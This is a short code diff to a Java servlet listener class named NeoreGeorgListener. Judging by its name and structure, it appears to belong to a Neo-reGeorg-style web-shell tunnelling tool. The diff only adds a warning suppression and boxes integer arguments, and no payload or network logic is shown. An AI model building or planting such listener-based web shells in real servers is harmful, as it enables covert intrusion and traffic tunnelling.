@@ -86,6 +86,7 @@ public class NeoreGeorgListener extends ClassLoader implements ServletRequestLis
     }
 
     @Override
+    @SuppressWarnings("all")
     public void requestInitialized(ServletRequestEvent sre) {
         HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
         try {
@@ -97,14 +98,14 @@ public class NeoreGeorgListener extends ClassLoader implements ServletRequestLis
                         response,
                         chars.toCharArray(),
                         base64Bytes,
-                        200,
-                        513,
-                        524288,
+                        new Integer(200),
+                        new Integer(513),
+                        new Integer(524288),
                         hello,
-                        1447564139,
-                        0,
-                        0,
-                        0,
+                        new Integer(1447564139),
+                        new Integer(0),
+                        new Integer(0),
+                        new Integer(0),
                 };
 
                 if (namespace.get(chars) == null) {
